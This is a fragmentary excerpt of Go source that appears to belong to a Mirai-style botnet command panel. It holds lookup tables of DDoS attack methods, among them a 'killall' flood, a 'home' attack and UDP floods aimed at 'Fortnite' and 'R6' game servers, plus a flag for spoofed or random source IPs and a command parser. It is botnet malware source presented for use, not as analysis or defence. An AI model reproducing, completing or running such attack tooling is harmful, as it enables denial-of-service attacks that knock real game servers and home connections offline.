...
var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    ...
    "source": FlagInfo {
        25,
        "Source IP address, 255.255.255.255 for random",//tftp Custom flood
    },
}
...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    ...
    "killallv1": AttackInfo {
        3,
        []uint8 { 0, 1, 6, 7, 8, 9, 10, 24, 25 },
        "killall Custom flood",
    },
    "home": AttackInfo {
        8,
        []uint8 { 0, 1, 7 },
	...
	"fortnite": AttackInfo {
        8,
        []uint8 {0, 1, 7},
        "UDP flood with. optimized for Most Gamer Servers",
    },
	"r6": AttackInfo {
        8,
        []uint8 {0, 1, 7},
...
func NewAttack(str string, admin int) (*Attack, error) {
    ...
    if len(args) == 0 {
        ...
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mIs An Invalid Command", args[0]))
        }
